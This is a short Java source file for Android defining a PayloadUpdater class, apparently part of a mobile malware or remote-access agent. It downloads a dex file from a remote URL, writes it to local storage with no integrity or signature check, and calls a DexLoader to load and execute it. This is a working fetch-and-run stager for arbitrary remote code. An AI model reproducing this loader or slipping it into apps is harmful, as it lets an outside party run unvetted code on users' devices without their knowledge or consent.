package com.mobilemorph.agent.util;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import android.content.Context;

public class PayloadUpdater {
    public static void updateAndLoad(Context context, String remoteUrl, String localPath) {
        try {
            // Download dex file
            URL url = new URL(remoteUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.connect();

            InputStream input = conn.getInputStream();
            OutputStream output = new FileOutputStream(localPath);

            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = input.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
            }

            output.flush();
            output.close();
            input.close();

            // Load downloaded payload
            DexLoader.loadAndExecute(context, localPath);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
